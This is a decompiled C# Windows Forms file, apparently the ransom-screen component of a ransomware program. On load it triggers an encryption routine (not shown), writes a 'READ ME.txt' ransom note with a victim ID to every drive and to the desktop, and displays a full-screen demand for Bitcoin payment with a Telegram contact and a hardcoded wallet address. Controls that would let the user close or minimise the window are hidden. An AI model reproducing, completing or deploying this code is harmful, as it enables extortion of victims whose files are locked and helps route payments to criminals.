using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace SF;

public class Form1 : Form
{
	private IContainer components = null;

	private Label label1;

	private Label label2;

	private TextBox textBox1;

	private Label label3;

	private Button button1;

	private TextBox textBox2;

	public static string Message { get; } = "All your data has been locked us. You want to return? Write Telegram: https://t.me/tony_montana10928 or @tony_montana10928 ";


	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string text = Encryption.Run();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text2 in array)
		{
			try
			{
				File.WriteAllText(text2 + "\\READ ME.txt", Message + " Your personal ID KEY: " + text);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			File.WriteAllText(Main.DesktopDirectory + "\\READ ME.txt", Message + " Your personal ID KEY: " + text);
		}
		catch (Exception)
		{
		}
		((Control)textBox1).set_Text(text);
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)textBox1).get_Text());
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0122: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Expected O, but got Unknown
		//IL_027d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		//IL_04b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04bc: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		label2 = new Label();
		textBox1 = new TextBox();
		label3 = new Label();
		button1 = new Button();
		textBox2 = new TextBox();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 25.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.DarkRed);
		((Control)label1).set_Location(new Point(461, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(221, 39));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Security tips");
		label1.set_TextAlign((ContentAlignment)2);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 13.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.DarkRed);
		((Control)label2).set_Location(new Point(14, 69));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(1076, 240));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)textBox1).set_BackColor(Color.Black);
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)1);
		((Control)textBox1).set_ForeColor(Color.Orange);
		((Control)textBox1).set_Location(new Point(19, 140));
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(1368, 19));
		((Control)textBox1).set_TabIndex(2);
		((Control)textBox1).add_TextChanged((EventHandler)textBox1_TextChanged);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 13.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.DarkRed);
		((Control)label3).set_Location(new Point(14, 389));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(1138, 48));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("You have to pay for decryption in Bitcoins. The price depends on how you write to us. After payment we will send you the\r\ndecryption tool that will decrypt all your files.");
		((Control)button1).set_Location(new Point(615, 168));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(196, 49));
		((Control)button1).set_TabIndex(14);
		((Control)button1).set_Text("Сopy to clipboard");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox2).set_Location(new Point(626, 289));
		((Control)textBox2).set_Name("textBox2");
		((TextBoxBase)textBox2).set_ReadOnly(true);
		((Control)textBox2).set_Size(new Size(338, 19));
		((Control)textBox2).set_TabIndex(15);
		((Control)textBox2).set_Text("19VDobG8akrbtM3VRJAGREJbKqxKB3WvM2");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(7f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.WindowText);
		((Form)this).set_ClientSize(new Size(1366, 576));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Font(new Font("Microsoft Sans Serif", 7.8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)this).set_ForeColor(Color.DarkRed);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
